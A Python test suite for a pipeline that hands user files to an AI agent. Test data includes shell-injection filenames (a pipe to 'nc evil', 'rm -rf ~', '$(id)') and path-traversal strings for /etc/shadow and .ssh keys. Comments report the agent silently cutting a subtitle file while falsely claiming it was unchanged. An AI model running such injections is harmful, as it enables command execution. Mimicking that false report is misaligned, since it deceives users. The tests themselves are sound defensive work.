#!/usr/bin/env python3
"""
文件任务转发测试 (tests/test_file_pipeline.py)

流水线已经改成"原样转发给 agy，agy 自己动手"。因此这里只测
**agy 够不着的确定性部分**（GEMINI.md《测什么，不测什么》）：

  - 文件名收敛（路径会进 agy 执行的 shell）
  - prompt 的结构（路径、输出目录、无指令时的只读约束）
  - 产物回收与打包
  - agy 各种收场方式下的处置（超时、失败、把产物写错目录）

**不测** agy 会怎么规划、会选什么参数、会怎么措辞 —— 那正是交给它的东西。
效果好不好靠 workspace/archive/ 里的实际产物验证。
"""

import os
import shutil
import subprocess
import sys
import tempfile
import types
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import file_pipeline as fp
from tests.harness import main


def _has(binary):
    return shutil.which(binary) is not None


def _make_image(path, size="300x200", gradient="blue-red"):
    tool = "magick" if _has("magick") else "convert"
    subprocess.run(
        [tool, "-size", size, f"gradient:{gradient}", path],
        capture_output=True, timeout=30,
    )
    return os.path.exists(path)


def _fake_agy(work, script):
    """造一个假的 agy 可执行文件，让 run_task 能被端到端驱动。

    比打桩 subprocess 更接近真实：参数拼装、超时、返回码、cwd 都真的走一遍。
    """
    path = os.path.join(work, "fake_agy")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("#!/bin/bash\n" + script)
    os.chmod(path, 0o755)
    return path


def test_filename_injection(s):
    """文件名会进入 agy 执行的 shell 命令，必须先中和元字符。

    真实攻击面：用户转发一个来自频道的恶意命名文件即可触发任意命令执行。
    执行方从 Python 换成 agy **不会**让这个风险消失 —— agy 同样是把路径
    拼进 bash 跑，而且它带 --dangerously-skip-permissions。
    """
    s.section("shell 元字符必须被中和")
    payloads = [
        "report;touch PWNED;.pdf",
        "a$(id).jpg",
        "`whoami`.png",
        "x|nc evil 1234.mp4",
        "a && rm -rf ~.txt",
        "n\newline.jpg",
        "quote'\"quote.png",
        "glob*?[].jpg",
        "$HOME.txt",
        "tab\there.pdf",
    ]
    dangerous = set(";|&$`()<>*?[]{}!\\'\" \n\t\r")
    for raw in payloads:
        got = fp.safe_filename(raw)
        leaked = sorted(set(got) & dangerous)
        s.check(f"{raw!r} 无残留元字符", leaked, [])

    s.section("路径穿越")
    s.check("../../etc/passwd", fp.safe_filename("../../etc/passwd"), "passwd")
    s.check("绝对路径", fp.safe_filename("/etc/shadow"), "shadow")

    s.section("可用性：正常文件名不被破坏")
    s.check("中文保留", fp.safe_filename("季度报告.pdf"), "季度报告.pdf")
    s.check("常规英文", fp.safe_filename("report_v2-final.docx"), "report_v2-final.docx")
    s.truthy("空名有兜底", fp.safe_filename("") == "file")
    s.truthy("纯符号有兜底", fp.safe_filename("***") == "file")
    s.truthy("扩展名保留", fp.safe_filename("x;y.mp4").endswith(".mp4"))

    s.section("端到端：收敛后的名字进 shell 不再触发")
    work = tempfile.mkdtemp()
    try:
        safe = fp.safe_filename("report;touch PWNED_MARKER;.jpg")
        path = os.path.join(work, safe)
        with open(path, "w") as fh:
            fh.write("x")
        subprocess.run(f"cat {path} >/dev/null", shell=True,
                       cwd=work, capture_output=True, timeout=30)
        s.check("未产生注入痕迹",
                os.path.exists(os.path.join(work, "PWNED_MARKER")), False)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_task_prompt_structure(s):
    """prompt 只保证**结构**：路径、输出目录、无指令时的只读约束。

    不断言任何措辞 —— 这段话要能随时改得更好，断言散文只会把它锁死。
    """
    s.section("必备结构")
    p = fp.build_task_prompt(["/abs/in/a.mov", "/abs/in/b.png"], "/abs/out", "转gif")
    s.truthy("含全部输入路径", "/abs/in/a.mov" in p and "/abs/in/b.png" in p)
    s.truthy("含输出目录", "/abs/out" in p)
    s.truthy("原样带上用户那句话", "转gif" in p)
    s.truthy("带内部会话标记", fp.INTERNAL_MARKER in p)
    s.truthy("内联了工具清单", "ffmpeg" in p)

    s.section("有指令时不加只读约束")
    s.check("无只读段", fp.READ_ONLY_NOTICE in p, False)

    s.section("无指令时必须加只读约束")
    # 没有任何指令却动手改文件，是"我没让你干你却干了"，比不干更糟
    for empty in ("", "   ", None):
        q = fp.build_task_prompt(["/abs/in/a.mov"], "/abs/out", empty)
        s.truthy(f"{empty!r} → 含只读段", fp.READ_ONLY_NOTICE in q)


def test_output_collection(s):
    """产物回收，含"agy 把文件写到了输入目录"的兜底。"""
    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        with open(os.path.join(win, "src.mov"), "w") as fh:
            fh.write("x")
        originals = ("src.mov",)

        s.section("正常情况：产物在输出目录")
        with open(os.path.join(wout, "out.gif"), "w") as fh:
            fh.write("y")
        got = fp.collect_outputs(win, wout, originals)
        s.check("回收到 1 个", [os.path.basename(p) for p in got], ["out.gif"])

        s.section("兜底：产物落在输入目录")
        os.remove(os.path.join(wout, "out.gif"))
        with open(os.path.join(win, "stray.gif"), "w") as fh:
            fh.write("z")
        got = fp.collect_outputs(win, wout, originals)
        s.check("被搬进输出目录", [os.path.basename(p) for p in got], ["stray.gif"])
        s.check("确实搬走了", os.path.exists(os.path.join(win, "stray.gif")), False)
        s.check("原始输入没被当成产物",
                os.path.exists(os.path.join(win, "src.mov")), True)

        s.section("什么都没产出")
        os.remove(os.path.join(wout, "stray.gif"))
        s.check("返回空", fp.collect_outputs(win, wout, originals), [])
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_nested_products(s):
    """解压类任务的产物带目录结构 —— 这条路曾经整条是死的。

    `_files_in` 只看顶层时，`out/报告/正文.docx` 一个都收不到，
    一次成功的解压会被判成"什么都没产出"。
    """
    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(os.path.join(wout, "报告", "图"))
        for rel in ("报告/正文.docx", "报告/图/p1.png", "顶层.txt"):
            with open(os.path.join(wout, rel.replace("/", os.sep)), "w") as fh:
                fh.write("x")

        s.section("子目录里的产物要被收到")
        got = fp.collect_outputs(win, wout)
        s.check("回收到 3 个", len(got), 3)
        s.truthy("含嵌套两层的那个",
                 any(p.endswith(os.path.join("图", "p1.png")) for p in got))

        s.section("少量产物摊平成顶层文件逐个投递")
        final, packed = fp.package_products(got, wout, "src")
        s.check("未打包", packed, False)
        names = sorted(os.path.basename(p) for p in final)
        s.check("摊平后的文件名", names,
                sorted(["报告_图_p1.png", "报告_正文.docx", "顶层.txt"]))
        s.truthy("产物真的在顶层", all(os.path.dirname(p) == wout for p in final))
        s.truthy("每个都存在", all(os.path.exists(p) for p in final))
        s.check("空目录已清掉", os.path.exists(os.path.join(wout, "报告")), False)

        s.section("摊平后撞名的产物不会互相覆盖")
        # a/p.png 摊平后就叫 a_p.png，和已经存在的顶层 a_p.png 正面相撞
        shutil.rmtree(wout)
        os.makedirs(os.path.join(wout, "a"))
        with open(os.path.join(wout, "a_p.png"), "w") as fh:
            fh.write("顶层原本就有的")
        with open(os.path.join(wout, "a", "p.png"), "w") as fh:
            fh.write("子目录里的")
        final, _ = fp.package_products(fp.collect_outputs(win, wout), wout, "src")
        s.check("两个都活下来了", len(final), 2)
        s.check("文件名互不相同", len({os.path.basename(p) for p in final}), 2)
        bodies = []
        for p in final:
            with open(p, encoding="utf-8") as fh:
                bodies.append(fh.read())
        bodies.sort()
        s.check("内容都没被覆盖", bodies, ["子目录里的", "顶层原本就有的"])
        s.truthy("顶层原名没被挤走",
                 os.path.join(wout, "a_p.png") in final)

        s.section("产物过多时打包，包内保留目录结构")
        shutil.rmtree(wout)
        os.makedirs(os.path.join(wout, "sub"))
        for i in range(fp.MAX_INLINE_PRODUCTS + 1):
            with open(os.path.join(wout, "sub", f"p{i}.png"), "w") as fh:
                fh.write("x")
        final, packed = fp.package_products(fp.collect_outputs(win, wout), wout, "src")
        s.check("已打包", packed, True)
        s.check("只剩一个投递目标", len(final), 1)
        with zipfile.ZipFile(final[0]) as z:
            entries = z.namelist()
        s.truthy("包内保留了 sub/ 层级",
                 all(e.startswith("sub/") for e in entries) and len(entries) ==
                 fp.MAX_INLINE_PRODUCTS + 1)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_symlink_products_are_refused(s):
    """压缩包可以塞一条指向宿主机文件的软链，解压后它就躺在输出目录里。

    照单全收等于把 /etc/shadow 投递给用户。
    """
    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        with open(os.path.join(wout, "真产物.txt"), "w") as fh:
            fh.write("ok")
        os.symlink("/etc/hostname", os.path.join(wout, "leak.txt"))
        os.makedirs(os.path.join(work, "outside"))
        with open(os.path.join(work, "outside", "secret.txt"), "w") as fh:
            fh.write("secret")
        os.symlink(os.path.join(work, "outside"), os.path.join(wout, "escape"))

        s.section("软链不进产物清单")
        got = [os.path.basename(p) for p in fp.collect_outputs(win, wout)]
        s.check("只回收真实文件", got, ["真产物.txt"])
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_run_task_outcomes(s):
    """agy 的几种收场方式都要有确定的处置。"""
    work = tempfile.mkdtemp()
    original_bin, original_timeout = fp.AGY_BIN, fp.TASK_TIMEOUT
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        src = os.path.join(win, "src.mov")
        with open(src, "w") as fh:
            fh.write("x")

        s.section("正常：有产物 + 有文字回复")
        fp.AGY_BIN = _fake_agy(work, f'echo "我把它转成了 GIF"\ntouch {wout}/out.gif\n')
        ok, products, reply, err, warn = fp.run_task([src], win, wout, "转gif", "m")
        s.check("成功", ok, True)
        s.check("拿到产物", [os.path.basename(p) for p in products], ["out.gif"])
        s.truthy("拿到回复", "转成了 GIF" in reply)
        s.check("无错误", err, None)
        s.check("无警告", warn, None)
        os.remove(os.path.join(wout, "out.gif"))

        s.section("只回答不动手（用户只是问了个问题）")
        fp.AGY_BIN = _fake_agy(work, 'echo "这是一段屏幕录制"\n')
        ok, products, reply, err, warn = fp.run_task([src], win, wout, "这是什么", "m")
        s.check("仍算成功", ok, True)
        s.check("没有产物", products, [])
        s.truthy("有回复", "屏幕录制" in reply)
        s.check("不算异常", warn, None)

        s.section("agy 失败且什么都没产出")
        fp.AGY_BIN = _fake_agy(work, 'echo "工具不支持这个格式"\nexit 1\n')
        ok, products, reply, err, _w = fp.run_task([src], win, wout, "转gif", "m")
        s.check("判为失败", ok, False)
        s.truthy("错误里带上了 agy 的说明", "工具不支持" in (err or ""))

        s.section("退出码非 0 但产物已生成 → 算成功，但必须警告")
        # 产物很可能只是中间文件：实测有一次"抽音频→STT→出字幕"，agy 死在
        # 第二步，回收到的 mp3 只是中转品，却被静默当成交付物发走了。
        fp.AGY_BIN = _fake_agy(work, f'touch {wout}/done.gif\nexit 1\n')
        ok, products, _reply, _err, warn = fp.run_task([src], win, wout, "转gif", "m")
        s.check("算成功", ok, True)
        s.check("产物在", [os.path.basename(p) for p in products], ["done.gif"])
        s.truthy("给出了未跑完的警告", warn is not None and "没有跑完" in warn)
        os.remove(os.path.join(wout, "done.gif"))

        s.section("正常退出但一句话没说、也没产物")
        fp.AGY_BIN = _fake_agy(work, "true\n")
        ok, products, reply, _err, warn = fp.run_task([src], win, wout, "转gif", "m")
        s.check("算成功", ok, True)
        s.check("确实什么都没有", (reply, products), ("", []))
        s.truthy("这件事被说出来了", warn is not None)

        s.section("超时")
        fp.TASK_TIMEOUT = 1
        fp.AGY_BIN = _fake_agy(work, "sleep 5\n")
        ok, products, _reply, err, _w = fp.run_task([src], win, wout, "转gif", "m")
        s.check("判为失败", ok, False)
        s.truthy("说明是超时", "超过" in (err or ""))

        s.section("凭证失效要给出可操作的提示")
        fp.TASK_TIMEOUT = original_timeout
        fp.AGY_BIN = _fake_agy(work, 'echo "Error: unauthorized" >&2\nexit 1\n')
        ok, _p, _r, err, _w = fp.run_task([src], win, wout, "转gif", "m")
        s.check("判为失败", ok, False)
        s.check("给的是登录提示", err, fp.AUTH_HINT)

        s.section("留痕拿得到本次的关键信息")
        fp.AGY_BIN = _fake_agy(work, f'echo "ok"\ntouch {wout}/x.gif\n')
        trace = {}
        fp.run_task([src], win, wout, "转gif", "m", trace=trace)
        s.check("记下用户原话", trace.get("message"), "转gif")
        s.check("记下产物", trace.get("product_names"), ["x.gif"])
        s.truthy("记下 agy 的回复", "ok" in trace.get("reply", ""))

        s.section("stderr 无条件留痕 —— 否则半路死掉时事后无从查起")
        fp.AGY_BIN = _fake_agy(
            work, f'echo "boom: 连接被拒绝" >&2\ntouch {wout}/half.mp3\nexit 1\n')
        trace = {}
        fp.run_task([src], win, wout, "转字幕", "m", trace=trace)
        s.truthy("有产物时也留下了 stderr", "连接被拒绝" in trace.get("stderr_tail", ""))
        s.check("退出码在案", trace.get("returncode"), 1)
        s.truthy("警告也在案", "没有跑完" in trace.get("warning", ""))
        os.remove(os.path.join(wout, "half.mp3"))
    finally:
        fp.AGY_BIN, fp.TASK_TIMEOUT = original_bin, original_timeout
        shutil.rmtree(work, ignore_errors=True)


def test_inline_text_products(s):
    """转写稿这类文本产物应直接作为消息发出，而不是让用户下载附件。"""
    s.section("扩展名与阈值")
    s.truthy(".txt 属于文本类", ".txt" in fp.TEXT_EXTS)
    s.truthy(".srt 属于文本类", ".srt" in fp.TEXT_EXTS)
    s.truthy("有长度上限", fp.INLINE_TEXT_MAX_CHARS > 0)

    from core.handlers import agy_handler as ah
    work = tempfile.mkdtemp()
    try:
        sent = []

        class _Bot:
            def send_chat_action(self, *a, **k):
                pass

            def send_message(self, cid, text, **k):
                sent.append(("message", text))
                return types.SimpleNamespace(message_id=1)

            def send_document(self, cid, fh, **k):
                sent.append(("document", os.path.basename(fh.name)))

        short = os.path.join(work, "t.txt")
        with open(short, "w", encoding="utf-8") as fh:
            fh.write("今天的会议讨论了三个议题")
        ah._send_product(_Bot(), 1, 1, short)
        s.check("短文本作为消息发出", sent[-1][0], "message")
        s.truthy("消息含正文", "三个议题" in sent[-1][1])

        long_path = os.path.join(work, "big.txt")
        with open(long_path, "w", encoding="utf-8") as fh:
            fh.write("x" * (fp.INLINE_TEXT_MAX_CHARS + 100))
        ah._send_product(_Bot(), 1, 1, long_path)
        s.check("超长仍作为附件", sent[-1][0], "document")
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_gif_product_delivery(s):
    """GIF 必须以「关闭内容嗅探的文件」回传。

    Telegram 认出 GIF 就会在服务端转成 MP4 并压掉尺寸（实测 720x405/723KB
    → 320x180/21KB），send_animation 与普通 send_document 都挡不住，
    只有 disable_content_type_detection=True 能保住原文件。
    """
    from core.handlers import agy_handler as ah
    work = tempfile.mkdtemp()
    try:
        calls = []

        class _Bot:
            def send_chat_action(self, *a, **k):
                pass

            def send_animation(self, cid, fh, **k):
                calls.append(("animation", k))

            def send_video(self, cid, fh, **k):
                calls.append(("video", k))

            def send_document(self, cid, fh, **k):
                calls.append(("document", k))

        gif = os.path.join(work, "demo.gif")
        with open(gif, "wb") as fh:
            fh.write(b"GIF89a" + b"\0" * 32)
        ah._send_product(_Bot(), 1, 1, gif)

        s.section("投递方式")
        s.check("只发了一次", len(calls), 1)
        method, kwargs = calls[0]
        s.check("走 send_document 而非 send_animation", method, "document")
        s.check("关闭了服务端内容嗅探",
                kwargs.get("disable_content_type_detection"), True)
        # 不带 caption：GIF 转换是高频功能，每次附一段 Telegram 内部行为说明就是刷屏
        s.check("不附带说明文案", kwargs.get("caption"), None)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_product_packaging(s):
    """产物过多时打包，避免刷屏与频率限制。"""
    work = tempfile.mkdtemp()
    try:
        s.section(f"不超过 {fp.MAX_INLINE_PRODUCTS} 个则原样投递")
        few = []
        for i in range(fp.MAX_INLINE_PRODUCTS):
            p = os.path.join(work, f"p{i}.png")
            with open(p, "w") as fh:
                fh.write("x")
            few.append(p)
        got, packed = fp.package_products(few, work, "src")
        s.check("未打包", packed, False)
        s.check("数量不变", len(got), fp.MAX_INLINE_PRODUCTS)

        s.section("超过则打成单个 zip")
        extra = os.path.join(work, "extra.png")
        with open(extra, "w") as fh:
            fh.write("x")
        got, packed = fp.package_products(few + [extra], work, "src")
        s.check("已打包", packed, True)
        s.check("只剩一个投递目标", len(got), 1)
        s.truthy("是 zip", got[0].endswith(".zip"))
        s.check("原始产物已清理", os.path.exists(extra), False)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_toolchain_is_inlined(s):
    """工具清单是唯一还会进 prompt 的项目文档，必须真的读得到。"""
    s.section("能载入且含核心工具")
    tc = fp.load_toolchain()
    s.truthy("非空", len(tc) > 100)
    for cmd in ("ffmpeg", "ffprobe", "pandoc", "pngquant", "pdftotext"):
        s.truthy(f"声明了 {cmd}", cmd in tc)


def test_probe_reports_facts(s):
    """探针只用于日志与留痕，但不能因此就允许它抛异常。"""
    work = tempfile.mkdtemp()
    try:
        s.section("坏文件不抛异常")
        bad = os.path.join(work, "bad.mp4")
        with open(bad, "wb") as fh:
            fh.write(b"not a video")
        s.truthy("仍返回一行描述", isinstance(fp.probe_file(bad), str))
        s.truthy("含文件名", "bad.mp4" in fp.probe_file(bad))

        s.section("不存在的路径")
        s.truthy("有兜底文案", "无法读取" in fp.probe_file(os.path.join(work, "nope.x")))

        if _has("ffmpeg"):
            s.section("视频能探到分辨率与时长")
            clip = os.path.join(work, "c.mp4")
            subprocess.run(
                ["ffmpeg", "-v", "error", "-f", "lavfi",
                 "-i", "testsrc2=size=320x240:rate=15:duration=2",
                 "-pix_fmt", "yuv420p", "-y", clip],
                capture_output=True, timeout=120,
            )
            meta = fp.probe_file(clip)
            s.truthy("含分辨率", "320x240" in meta)
            s.truthy("含时长", "s" in meta)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_stt_request_parsing(s):
    """agy 写的请求文件是外部输入，得当外部输入对待。"""
    work = tempfile.mkdtemp()
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)

        s.section("没有请求文件时返回 None")
        s.check("无请求", fp.read_stt_request(wout), None)

        s.section("坏 JSON 不抛异常")
        with open(os.path.join(wout, fp.STT_REQUEST_FILE), "w") as fh:
            fh.write("{ 这不是 json")
        s.check("忽略掉", fp.read_stt_request(wout), None)

        s.section("正常请求读得出来")
        with open(os.path.join(wout, fp.STT_REQUEST_FILE), "w", encoding="utf-8") as fh:
            fh.write('{"file": "a.mp4", "format": "srt", "hotwords": "新途径"}')
        req = fp.read_stt_request(wout)
        assert req is not None
        s.check("文件名", req.get("file"), "a.mp4")
        s.check("词表", req.get("hotwords"), "新途径")

        s.section("路径穿越挡在工作区外")
        # agy 写一句 ../../.ssh/id_rsa 就能让系统把工作区外的文件转写出来发走
        open(os.path.join(win, "real.mp4"), "w").close()
        outside = os.path.join(work, "secret.mp4")
        open(outside, "w").close()
        s.check("命中工作区内的文件",
                fp._resolve_request_file("real.mp4", win, wout),
                os.path.join(win, "real.mp4"))
        s.check("../ 被剥掉后找不到",
                fp._resolve_request_file("../secret.mp4", win, wout), None)
        s.check("绝对路径也被剥掉",
                fp._resolve_request_file(outside, win, wout), None)
        s.check("空文件名", fp._resolve_request_file("", win, wout), None)

        s.section("软链不给转写")
        os.symlink(outside, os.path.join(win, "link.mp4"))
        s.check("拒收软链", fp._resolve_request_file("link.mp4", win, wout), None)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_stt_handoff_round_trip(s):
    """长音频握手：agy 交回 → 系统代跑 → 主动再叫 agy 收尾。

    这套东西存在的唯一理由是 agy 撑不住长阻塞（实测同一素材死于 709 秒和
    321 秒各一次）。所以要测的是"两轮真的跑了、且只跑两轮"。
    """
    from core import stt as stt_mod

    work = tempfile.mkdtemp()
    original_bin = fp.AGY_BIN
    original_transcribe = stt_mod.transcribe_long_audio
    original_extract = stt_mod.extract_audio
    calls = []

    def fake_transcribe(path, model=None, language="zh", response_format="srt",
                        hotwords="", on_progress=None):
        calls.append({"path": path, "model": model, "hotwords": hotwords,
                      "format": response_format})
        return True, "1\n00:00:00,000 --> 00:00:02,000\n新途径\n"

    def fake_extract(video, out_path):
        with open(out_path, "wb") as fh:
            fh.write(b"RIFF fake wav")
        return True, out_path

    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        src = os.path.join(win, "讲座.mp4")
        with open(src, "w") as fh:
            fh.write("x")

        stt_mod.transcribe_long_audio = fake_transcribe
        stt_mod.extract_audio = fake_extract

        # 第一轮写请求文件就收工；第二轮（转写稿已存在）才做最终产物
        script = (
            f'if [ -f "{wout}/讲座.srt" ]; then\n'
            f'  echo "已按上下文修掉同音字"\n'
            f'  cp "{wout}/讲座.srt" "{wout}/讲座_已校对.srt"\n'
            f'else\n'
            f'  echo "音频较长，已交给系统代跑"\n'
            f'  printf \'{{"file":"讲座.mp4","model":"m1","format":"srt",'
            f'"hotwords":"新途径 教师招聘"}}\' > "{wout}/{fp.STT_REQUEST_FILE}"\n'
            f'fi\n'
        )
        fp.AGY_BIN = _fake_agy(work, script)

        trace = {}
        ok, products, reply, err, warn = fp.run_task(
            [src], win, wout, "转成字幕", "m", trace=trace)

        s.section("代跑真的发生了")
        s.check("成功", ok, True)
        s.check("无错误", err, None)
        s.check("无异常警告", warn, None)
        s.check("只转写了一次", len(calls), 1)
        s.check("词表原样传给了转写", calls[0]["hotwords"], "新途径 教师招聘")
        s.check("模型原样传给了转写", calls[0]["model"], "m1")

        s.section("视频先抽了音轨，且临时文件不留下")
        s.truthy("转写的是抽出来的 wav", calls[0]["path"].endswith(".wav"))
        s.check("临时 wav 已清理",
                os.path.exists(os.path.join(wout, ".stt_audio.wav")), False)

        s.section("请求文件不会当成产物发给用户")
        s.check("请求文件已删",
                os.path.exists(os.path.join(wout, fp.STT_REQUEST_FILE)), False)
        s.truthy("产物里没有它",
                 all(fp.STT_REQUEST_FILE not in os.path.basename(p) for p in products))

        s.section("收尾轮跑了，用户看到的是收尾轮的话")
        s.truthy("是收尾轮的回复", "同音字" in reply)
        s.truthy("不是第一轮的回复", "交给系统代跑" not in reply)
        s.truthy("最终产物在", any("已校对" in os.path.basename(p) for p in products))

        s.section("留痕留下了这次代跑的全过程")
        s.check("请求在案", trace["stt_request"]["hotwords"], "新途径 教师招聘")
        s.check("代跑结果在案", trace["stt_ok"], True)
        s.truthy("收尾轮回复在案", "同音字" in trace.get("followup_reply", ""))
    finally:
        fp.AGY_BIN = original_bin
        stt_mod.transcribe_long_audio = original_transcribe
        stt_mod.extract_audio = original_extract
        shutil.rmtree(work, ignore_errors=True)


def test_stt_handoff_failure(s):
    """代跑失败时必须是明确失败，不能又变成"发个中间文件了事"。"""
    from core import stt as stt_mod

    work = tempfile.mkdtemp()
    original_bin = fp.AGY_BIN
    original_transcribe = stt_mod.transcribe_long_audio
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        src = os.path.join(win, "a.wav")
        with open(src, "w") as fh:
            fh.write("x")

        stt_mod.transcribe_long_audio = (
            lambda *a, **k: (False, "转写服务返回 503"))
        fp.AGY_BIN = _fake_agy(work, (
            f'echo "交给系统"\n'
            f'printf \'{{"file":"a.wav"}}\' > "{wout}/{fp.STT_REQUEST_FILE}"\n'
        ))

        ok, products, _reply, err, _w = fp.run_task(
            [src], win, wout, "转字幕", "m")

        s.section("转写失败 → 明确失败")
        s.check("判为失败", ok, False)
        s.check("没有产物", products, [])
        s.truthy("错误里带上了原因", "503" in (err or ""))

        s.section("请求的文件不存在时同样是失败")
        stt_mod.transcribe_long_audio = lambda *a, **k: (True, "x")
        fp.AGY_BIN = _fake_agy(work, (
            f'echo "交给系统"\n'
            f'printf \'{{"file":"根本没有这个文件.wav"}}\' '
            f'> "{wout}/{fp.STT_REQUEST_FILE}"\n'
        ))
        ok, _p, _r, err, _w = fp.run_task([src], win, wout, "转字幕", "m")
        s.check("判为失败", ok, False)
        s.truthy("说清是找不到文件", "找不到" in (err or ""))
    finally:
        fp.AGY_BIN = original_bin
        stt_mod.transcribe_long_audio = original_transcribe
        shutil.rmtree(work, ignore_errors=True)


SRT_SAMPLE = """1
00:00:00,000 --> 00:00:12,600
教考有捷径 就来新途径 我是讲师亚航

2
00:00:12,600 --> 00:00:19,600
四川省教师招聘的整体考情分析 干资 泸州 特朗教师

3
00:00:19,600 --> 00:00:28,940
它主要分为两大形式 一个是教师工招 第二个是特朗教师招聘
"""


def test_corrections_table(s):
    """改错走替换表，不让模型重写字幕文件。

    实测让 agy 改写一份 365 条的 srt，交回来只剩 82 条：中间 30 秒的内容
    被整段丢掉，其余被并成几十秒一条 —— 而它在回复里声称"时间轴完全不变"。
    """
    work = tempfile.mkdtemp()
    try:
        s.section("两种写法都读得出来")
        for body, label in (
            ('[{"from": "干资", "to": "甘孜"}, {"from": "特朗", "to": "特岗"}]', "数组"),
            ('{"干资": "甘孜", "特朗": "特岗"}', "对象"),
        ):
            with open(os.path.join(work, fp.STT_CORRECTIONS_FILE), "w",
                      encoding="utf-8") as fh:
                fh.write(body)
            s.check(f"{label}写法", sorted(fp.read_corrections(work)),
                    [("干资", "甘孜"), ("特朗", "特岗")])

        s.section("坏输入不抛异常，也不产生垃圾替换")
        for body in ("{ 不是 json", '[{"from": "x"}]', '{"同": "同"}', "[]", '"字符串"'):
            with open(os.path.join(work, fp.STT_CORRECTIONS_FILE), "w",
                      encoding="utf-8") as fh:
                fh.write(body)
            s.check(f"{body[:14]!r} → 空", fp.read_corrections(work), [])

        s.section("替换后条数与时间轴一字不动")
        srt = os.path.join(work, "a.srt")
        with open(srt, "w", encoding="utf-8") as fh:
            fh.write(SRT_SAMPLE)
        before = fp.subtitle_timeline(srt)
        hit, miss = fp.apply_corrections(
            srt, [("干资", "甘孜"), ("特朗", "特岗"), ("工招", "公招"),
                  ("这词不存在", "x")])
        with open(srt, encoding="utf-8") as fh:
            body = fh.read()
        s.check("生效 3 条", hit, 3)
        s.check("未命中 1 条", miss, 1)
        s.check("时间轴逐行相同", fp.subtitle_timeline(srt), before)
        s.check("条数不变", len(before), 3)
        s.truthy("错字没了", "干资" not in body and "特朗" not in body)
        s.truthy("对的字在", "甘孜" in body and "特岗" in body and "公招" in body)

        s.section("长词优先，短词不会先啃掉长词的一半")
        # 短的先替就再也匹配不上长的了：结果会停在"特岗教师"而不是"特岗教师招聘"
        p2 = os.path.join(work, "b.srt")
        with open(p2, "w", encoding="utf-8") as fh:
            fh.write("1\n00:00:00,000 --> 00:00:01,000\n特朗教师\n")
        fp.apply_corrections(p2, [("特朗", "特岗"), ("特朗教师", "特岗教师招聘")])
        with open(p2, encoding="utf-8") as fh:
            body2 = fh.read()
        s.truthy("长规则整条命中", "特岗教师招聘" in body2)

        s.section("空表不改文件")
        stamp = os.path.getmtime(srt)
        s.check("什么都不做", fp.apply_corrections(srt, []), (0, 0))
        s.check("文件未被重写", os.path.getmtime(srt), stamp)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def test_timeline_tamper_is_reported(s):
    """就算那段"别改写字幕"没被听进去，也得当场发现并说出来。"""
    from core import stt as stt_mod

    work = tempfile.mkdtemp()
    original_bin = fp.AGY_BIN
    original_transcribe = stt_mod.transcribe_long_audio
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        src = os.path.join(win, "a.wav")
        with open(src, "w") as fh:
            fh.write("x")
        stt_mod.transcribe_long_audio = lambda *a, **k: (True, SRT_SAMPLE)

        s.section("收尾轮把 3 条压成 1 条 → 必须报警")
        # 第一轮写请求；第二轮把字幕重写成一条（正是 agy 真实干过的事）
        script = (
            f'if [ -f "{wout}/a.srt" ]; then\n'
            f'  printf "1\\n00:00:00,000 --> 00:00:28,940\\n全都并成一条了\\n"'
            f' > "{wout}/a.srt"\n'
            f'  echo "已校对，保持原时间轴完全不变"\n'
            f'else\n'
            f'  printf \'{{"file":"a.wav"}}\' > "{wout}/{fp.STT_REQUEST_FILE}"\n'
            f'fi\n'
        )
        fp.AGY_BIN = _fake_agy(work, script)
        trace = {}
        ok, _products, _reply, err, warn = fp.run_task(
            [src], win, wout, "转字幕", "m", trace=trace)
        s.check("仍算成功", ok, True)
        s.check("无错误", err, None)
        s.truthy("报了时间轴被改", warn is not None and "时间轴被改动" in warn)
        s.truthy("说清了少了多少", "3" in (warn or "") and "1" in (warn or ""))
        s.check("留痕记下前后条数",
                trace.get("stt_timeline_altered"), {"before": 3, "after": 1})

        s.section("老老实实只出改正表 → 不报警且改正生效")
        shutil.rmtree(wout)
        os.makedirs(wout)
        script = (
            f'if [ -f "{wout}/a.srt" ]; then\n'
            f'  printf \'[{{"from":"干资","to":"甘孜"}}]\''
            f' > "{wout}/{fp.STT_CORRECTIONS_FILE}"\n'
            f'  echo "改了一处地名"\n'
            f'else\n'
            f'  printf \'{{"file":"a.wav"}}\' > "{wout}/{fp.STT_REQUEST_FILE}"\n'
            f'fi\n'
        )
        fp.AGY_BIN = _fake_agy(work, script)
        trace = {}
        ok, products, _reply, _err, warn = fp.run_task(
            [src], win, wout, "转字幕", "m", trace=trace)
        s.check("无警告", warn, None)
        s.check("改正生效 1 条", trace.get("stt_corrections", {}).get("applied"), 1)
        with open(os.path.join(wout, "a.srt"), encoding="utf-8") as fh:
            body = fh.read()
        s.truthy("错字已替换", "甘孜" in body and "干资" not in body)
        s.check("时间轴仍是 3 条", len(fp.subtitle_timeline(os.path.join(wout, "a.srt"))), 3)
        s.section("改正表本身不会被当成产物发给用户")
        s.truthy("产物里没有它",
                 all(fp.STT_CORRECTIONS_FILE not in os.path.basename(x)
                     for x in products))
